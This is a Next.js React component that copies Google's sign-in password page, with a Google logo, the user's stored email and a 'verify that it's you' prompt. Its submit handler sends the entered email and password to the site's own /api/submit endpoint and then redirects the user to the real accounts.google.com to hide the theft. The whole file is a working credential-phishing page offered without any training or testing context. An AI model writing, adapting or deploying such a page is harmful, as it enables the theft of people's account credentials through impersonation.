"use client";
import { useState, useEffect } from "react";
import {useRouter} from 'next/navigation';
import Image from 'next/image'
export default function PasswordPage() {

  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);


  useEffect(() => {
    const savedEmail = localStorage.getItem("email");
    if (savedEmail) setEmail(savedEmail);
  }, []);

  const handleSubmit = async  (e: React.FormEvent) => {
    e.preventDefault();
    const data = { email, password };
      try {
          await fetch("/api/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

        router.push('https://accounts.google.com')
      } catch (err) {
        console.log(err)
      }
  };

  return (
    <div
      style={{ backgroundColor: "#111111", overflow: "hidden", position: "fixed" }}
      className="min-h-screen text-white w-full"
    >
      <div className="space-y-4 px-6 pt-6">
        <Image src="/google.png" alt="Google logo" width={40} height={40} />
        <h1 className="text-4xl">Welcome</h1>
        <div className="relative flex items-center justify-center border rounded-full px-1.5 py-1 pr-4 max-w-fit">
          <img src="/profile.png" alt="" className="w-5 h-5" />
          <p className="text-sm ml-2 font-light">
            {email}
          </p>
        </div>
        <p className="text-sm mt-9">To continue, first verify that it's you</p>
      </div>

      <form id="formpass" onSubmit={handleSubmit}>
        <div className="my-12 px-6">
          <input
            id="pass"
            className="p-4 rounded-md focus:outline-none focus:border-blue-300 w-full mb-1 bg-transparent border border-gray-600"
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <div className="flex items-center ml-2 my-3">
            <input
              type="checkbox"
              className="custom"
              id="checkbox"
              checked={showPassword}
              onChange={(e) => setShowPassword(e.target.checked)}
            />
            <p className="ml-2 font-medium text-sm tracking-wider">Show password</p>
          </div>
        </div>

        <div className="flex justify-between mt-8 items-center text-sm font-semibold px-2">
          <a href="#" className="text-blue-300 hover:bg-gray-900 py-2 px-4 rounded-3xl">
            Try Another way
          </a>
          <button
            type="submit"
            className="bg-blue-300 py-2 px-6 rounded-3xl text-gray-900 font-medium focus:outline-none"
          >
            Next
          </button>
        </div>
      </form>

      <div className="absolute bottom-5 text-white justify-between flex text-sm w-full px-4">
        <p>English (United States)</p>
        <div className="flex justify-between items-center">
          <a href="" className="mx-3">
            Help
          </a>
          <a href="" className="mx-3">
            Privacy
          </a>
          <a href="" className="mx-3">
            Terms
          </a>
        </div>
      </div>
    </div>
  );
}
